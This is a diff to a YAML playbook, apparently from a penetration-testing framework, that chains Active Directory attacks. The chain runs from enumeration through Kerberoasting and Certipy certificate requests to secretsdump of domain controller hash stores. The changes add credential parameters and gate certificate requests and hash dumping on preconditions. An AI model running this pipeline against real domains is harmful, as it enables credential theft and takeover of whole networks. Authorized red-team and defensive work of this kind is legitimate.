@@ -8,7 +8,7 @@ description: >
   Phase progression: enumeration → vulnerability assessment → exploitation → post-exploitation.
   Requires REDTEAM engagement mode for exploitation steps (kerberoast, certipy_req, secretsdump).
 
-tags: [ad, active-directory, bloodhound, kerberoast, certipy, impacket, redteam]
+tags: [ad, active-directory, bloodhound, kerberoast, certipy, impacket, ldap, redteam]
 
 variables:
   target: ""        # Domain controller IP
@@ -19,6 +19,7 @@ variables:
   wordlist: "/usr/share/seclists/Usernames/xato-net-10-million-usernames-nt.txt"
   ca_name: ""       # CA name for Certipy cert requests (from certipy_find output)
   template: ""      # Vulnerable template name (from certipy_vuln output)
+  da_access: "false"  # Set to "true" manually after confirming DA-level access to enable secretsdump
 
 steps:
 
@@ -49,11 +50,16 @@ steps:
   # ── SMB/LDAP/RPC deep enumeration ────────────────────────────────────────────
   # enum4linux-ng covers users, groups, shares, password policy, domain info.
   # More comprehensive than individual ldapsearch queries.
+  # Runs with domain credentials when available — falls back to null-session
+  # if username/password are empty (useful for initial unauthenticated probe).
   - name: enum4linux_ng
     tool: ad_attack
     action: enum4linux_ng
     params:
       target: "${target}"
+      username: "${username}"
+      password: "${password}"
+      domain: "${domain}"
     timeout: 120
     on_fail: continue
 
@@ -165,6 +171,7 @@ steps:
   - name: certipy_req
     tool: ad_attack
     action: certipy_req
+    condition: "${ca_name} != '' && ${template} != ''"
     params:
       target: "${target}"
       domain: "${domain}"
@@ -187,9 +194,12 @@ steps:
   # Dump NTDS.dit (domain hashes), SAM, and LSA secrets from the domain controller.
   # Requires domain admin credentials or a DA certificate obtained above.
   # All domain account hashes — game over for the domain.
+  # Set da_access=true manually after confirming DA-level access (e.g. after
+  # certipy_req succeeds or kerberoast yields a DA hash that cracks).
   - name: secretsdump
     tool: ad_attack
     action: secretsdump
+    condition: "${da_access} == 'true'"
     params:
       target: "${target}"
       domain: "${domain}"
